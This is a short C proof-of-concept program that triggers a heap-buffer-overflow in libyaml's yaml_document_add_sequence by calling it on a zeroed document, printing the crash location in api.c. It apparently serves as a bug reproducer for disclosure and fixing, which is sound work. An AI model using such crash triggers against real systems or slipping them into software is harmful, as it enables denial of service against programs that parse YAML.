#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <yaml.h>

void poc() {
    yaml_document_t document;
    memset(&document, 0, sizeof(yaml_document_t));
    yaml_char_t *anchor = "rsslab";
    yaml_char_t *tag = "tag:yaml.org,2002:str";
    int style = YAML_ANY_SEQUENCE_STYLE;
    yaml_document_add_sequence(&document, tag, style);
}

int main(int argc, char *argv[])
{
    printf("heap-buffer-overflow on libyaml/src/api.c:1274:10\n");
    poc();
    return 0;
}
